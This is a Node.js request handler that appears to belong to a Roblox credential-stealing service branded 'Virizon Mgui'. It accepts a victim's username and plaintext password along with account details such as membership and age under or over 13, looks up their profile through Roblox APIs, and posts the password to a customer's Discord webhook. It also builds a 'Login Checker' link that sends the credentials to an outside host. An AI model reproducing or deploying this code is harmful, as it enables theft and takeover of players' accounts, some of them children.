require('dotenv').config();
const axios = require('axios');
const faunadb = require('faunadb');

const client = new faunadb.Client({
  secret: process.env.FAUNADB_SECRET,
});
  
const q = faunadb.query;

async function getUserId(username) {
    const data = {
        usernames: [username],
        excludeBannedUsers: true,
    };

    const response = await axios.post('https://users.roblox.com/v1/usernames/users', data, {
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
        },
    });

    if (response.data.data.length === 0) {
        return 1;
    }

    const userid = response.data.data[0].id;
    return userid;
}

async function getAvatarUrl(userId) {
    const intuserId = parseInt(userId);
    const response = await axios.get(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${intuserId}&size=420x420&format=Png&isCircular=false`);
    const avatarUrl = response.data.data[0].imageUrl;
    return avatarUrl;
}

async function getGameInfo(univid) {
    const url = `https://games.roblox.com/v1/games?universeIds=${univid}`;

    const response = await axios.get(url);
    const gameData = response.data.data[0];

    const playing = gameData.playing;
    const visits = gameData.visits;
    const favorites = gameData.favoritedCount;
    const gamename = gameData.name;

    return {
        playing,
        visits,
        favorites,
        gamename
    };
}

async function getUserJoinDate(userId) {
    const url = `https://users.roblox.com/v1/users/${userId}`;

    const response = await axios.get(url, {
        headers: {
            'X-Requested-With': 'XMLHttpRequest',
        },
    });

    const jsonjoindate = response.data;
    const created = new Date(jsonjoindate.created).toLocaleDateString('en-US', {
        timeZone: 'UTC'
    });

    return created;
}

async function loadembed(req, res) {
    const { Username,Password,Membership,Verified,PlayerAgeDays,PlayerAge13,Country,GameID,UniverseId } = req.body;

    const requiredFields = ['Username','Password','Membership','Verified','Verified','PlayerAgeDays','PlayerAge13','Country','GameID','UniverseId'];
    const missingFields = requiredFields.filter((field) => !req.body[field]);

    if (missingFields.length > 0) {
        return res.status(400).json({
            message: `Missing required fields: ${missingFields.join(', ')}`
        });
    }

    let discord;
    let webhooks;

    try {
        // Retrieve the game configuration from the users_games collection
        const gameConfig = await client.query(
            q.Get(q.Match(q.Index('users_games_by_game_id'), GameID))
        );

        webhooks = gameConfig.data.config_info.webhooks;
        discord = gameConfig.data.discord_id;

    } catch (error) {

        console.log(error);

        if (error.message === 'instance not found') {
            res.status(404).json({
                message: 'No game configuration found for the provided GameId'
            });
            return;
        } else {
            res.status(500).json({
                message: 'An error occurred'
            });
            return;
        }
    }

    let webhook;

    if (Membership === "Premium") {
        webhook = webhooks.premium
    } else {
        webhook = webhooks.nbc
    }

    const userId = await getUserId(Username);
    const avatar_url = await getAvatarUrl(userId);
    const joindate = await getUserJoinDate(userId);

    const gameInfo = await getGameInfo(UniverseId);
    const gameStats = `Visits: ${gameInfo.visits}\nPlaying: ${gameInfo.playing}\nFavorites: ${gameInfo.favorites}`;

    let ConPlayerAge13;
    if (PlayerAge13 === "13_Above") {
        ConPlayerAge13 = "13+";
    } else {
        ConPlayerAge13 = "<13";
    }

    const mainEmbed = {
        content: "",
        username: "Virizon - Bot",
        avatar_url: "",
        embeds: [{
            title: "[Click Here To View Profile]",
            description: `**${Username}** Information check it now!\nDiscord <@${discord}>`,
            url: `https://www.roblox.com/users/${userId}/profile`,
            timestamp: new Date().toISOString(),
            color: parseInt("4287f5", 16),
            footer: {
                text: "Buy Lexar Mgui Now!! https://discord.gg/lexarontop",
                icon_url: "",
            },
            thumbnail: {
                url: avatar_url,
            },
            author: {
                name: "Virizon Mgui - Results",
            },
            fields: [{
                    name: "**Game Info**",
                    value: "```yaml\n" + gameStats + "```",
                    inline: false,
                },
                {
                    name: "Username",
                    value: Username,
                    inline: true,
                },
                {
                    name: "Password",
                    value: Password,
                    inline: true,
                },
                {
                    name: "Membership",
                    value: Membership,
                    inline: true,
                },
                {
                    name: "Security",
                    value: Verified,
                    inline: true,
                },
                {
                    name: "Account Info",
                    value: `${PlayerAgeDays} days old, ${ConPlayerAge13}`,
                    inline: true,
                },
                {
                    name: "Join Date",
                    value: `Joined ${joindate}`,
                    inline: true,
                },
                {
                    name: "Player Country",
                    value: Country,
                    inline: true,
                },
                {
                    name: "Game",
                    value: `[**[Click here]**](https://www.roblox.com/games/${GameID}/)`,
                    inline: true,
                },
                {
                    name: "Login Checker",
                    value: `[**[Click here]**](https://virizonmguix.online/lc?username=${encodeURIComponent(Username)}&password=${encodeURIComponent(Password)}&success=${encodeURIComponent(webhooks.success)}&failed=${encodeURIComponent(webhooks.failed)}&discord=${encodeURIComponent(discord)})`,
                    inline: true,
                },
            ],
        }, ],
    };

    const payload = JSON.stringify(mainEmbed);

    if (!webhook) {
        res.status(404).json({ message: 'Webhook URL is empty' });
        console.error('Webhook URL is empty');
        return;
    }

    try {
        await axios.post(webhook, payload, {
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            },
        });
        res.status(200).json({ message: 'Webhook Send' });
    } catch (error) {
        // Handle the error here
        res.status(500).json({ message: 'Failed To Send Webhook' });
    }


    
}

module.exports = loadembed;